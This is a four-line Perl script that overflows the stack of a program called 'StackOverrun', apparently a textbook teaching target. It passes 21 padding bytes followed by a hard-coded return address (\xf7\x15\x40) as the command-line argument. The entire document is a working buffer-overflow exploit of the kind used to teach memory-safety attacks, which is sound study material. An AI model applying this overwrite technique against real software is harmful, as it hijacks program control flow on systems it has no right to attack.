$arg = ("Z"x21)."\xf7\x15\x40";
$cmd = "StackOverrun ".$arg;

system($cmd);